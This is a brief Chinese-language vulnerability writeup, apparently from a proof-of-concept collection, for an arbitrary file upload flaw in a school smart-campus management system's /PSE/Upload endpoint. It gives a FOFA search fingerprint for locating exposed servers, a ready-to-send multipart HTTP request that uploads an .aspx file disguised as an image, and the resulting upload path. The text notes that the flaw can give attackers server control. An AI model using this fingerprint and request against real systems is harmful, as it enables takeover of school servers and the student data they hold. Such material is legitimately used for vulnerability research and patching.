## 新中新中小学智慧校园信息管理系统Upload接口存在任意文件上传漏洞

新中新中小学智慧校园信息管理系统PSE存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## fofa

```yaml
body="/Login/IndexMobi"
```

![image-20240712202008295](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407122020397.png)

## poc

```yaml
POST /PSE/Upload HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 149
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="test.aspx"
Content-Type: image/jpg

123
--00content0boundary00--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407122020837.png)

文件路径

`/Upload/PrimarySchoolEnrollment/70895ada-146e-4c52-a377-af0fb7b05d57.aspx`